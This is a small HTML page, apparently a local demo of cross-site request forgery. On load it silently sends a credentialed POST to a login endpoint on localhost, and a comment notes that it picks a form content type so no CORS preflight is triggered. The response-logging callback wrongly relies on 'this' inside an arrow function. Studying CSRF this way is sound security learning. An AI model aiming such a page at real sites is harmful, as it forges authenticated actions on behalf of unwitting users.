<html>
<head>
  <title>CSRF</title>
  <script>
    window.onload = () => {
      // XHR生成
      const xhr = new XMLHttpRequest()
      xhr.onreadystatechange = () => {
        if (this.readyState === 4 && this.status == 200) {
          console.log(this.responseText)
        }
      }
      xhr.open('POST', 'http://localhost:8080/login')
      xhr.withCredentials = true

      // リクエスト送信(プリフライトリクエストを発生させない為、JSON形式で送信しない)
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
      const postData = encodeURIComponent('email') + '=' + encodeURIComponent('foo@example.com')
      xhr.send(postData)
    }
  </script>
</head>
<body>
  Page for CSRF
</body>
</html>